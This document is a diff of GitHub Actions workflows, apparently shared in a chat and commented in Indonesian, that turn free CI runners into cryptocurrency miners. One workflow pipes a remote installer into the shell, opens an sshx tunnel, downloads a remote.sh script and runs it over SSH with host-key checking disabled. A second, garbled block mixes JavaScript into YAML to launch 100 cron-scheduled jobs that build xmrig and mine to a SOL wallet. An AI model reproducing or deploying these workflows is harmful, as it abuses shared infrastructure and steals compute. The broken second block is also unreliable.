@@ -1,24 +1,47 @@
+> Rey:
 name: sshx-vps-mining
 
-on: workflow_dispatch: schedule: - cron: "0 */6 * * *"  # Jalan otomatis tiap 6 jam
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */6 * * *"  # Jalan otomatis tiap 6 jam
 
-jobs: mining: runs-on: ubuntu-latest timeout-minutes: 360
+jobs:
+  mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
 
-steps:
-  - name: Connect to SSHX VPS and run remote miner
-    run: |
-      echo "[+] Starting SSHX Tunnel..."
-      curl -sSf https://sshx.io/get | sh -s run > log.txt &
+    steps:
+      - name: Connect to SSHX VPS and run remote miner
+        run: |
+          echo "[+] Starting SSHX Tunnel..."
+          curl -sSf https://sshx.io/get | sh -s run > log.txt &
 
-      sleep 10  # Tunggu sshx aktif
+          sleep 5
 
-      LINK=$(grep -o 'https://sshx.io/[^ ]*' log.txt | head -n1)
-      HOST=$(echo $LINK | cut -d/ -f3)
-      echo "[+] SSHX Link: $LINK"
+          LINK=$(grep -o 'https://sshx.io/[^ ]*' log.txt | head -n1)
+          HOST=$(echo $LINK | cut -d/ -f3)
+          echo "[+] SSHX Link: $LINK"
 
-      # Unduh skrip mining dari GitHub (pastikan kamu upload remote.sh ke repo kamu)
-      curl -sO https://raw.githubusercontent.com/Nsal12/sal/refs/heads/main/remote.sh
-      chmod +x remote.sh
+          sudo apt update -y > /dev/null
+          sudo apt install -y netcat > /dev/null
 
-      echo "[+] Menjalankan script mining di VPS via SSH..."
-      ssh -o StrictHostKeyChecking=no -p 2222 sshx@$HOST 'bash -s' < remote.sh
+          # Tunggu sampai SSHX siap (port 2222 terbuka)
+          for i in {1..15}; do
+            echo "[*] Menunggu koneksi SSHX tersedia ($i/15)..."
+            nc -z $(echo $HOST | cut -d: -f1) 2222 && break
+            sleep 2
+          done
+
+          echo "[+] Menjalankan script mining di VPS via SSH..."
+          curl -sO https://raw.githubusercontent.com/Nsal12/sal/refs/heads/main/remote.sh
+          chmod +x remote.sh
+
+          ssh -o StrictHostKeyChecking=no -p 2222 sshx@$HOST 'bash -s' < remote.sh
+
+> Rey:
+name: sol-miner
+
+on: workflow_dispatch: schedule: - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
+
+jobs: " + Array.from({ length: 100 }, (_, i) => { const idx = i + 1; return  miner${idx}: runs-on: ubuntu-latest timeout-minutes: 360 steps: - name: Start Miner ${idx} run: | sudo apt update sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev git clone https://github.com/xmrig/xmrig.git mkdir xmrig/build && cd xmrig/build cmake .. make -j$(nproc) ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker${idx} -p x --threads=4; }).join("\n") } ] }
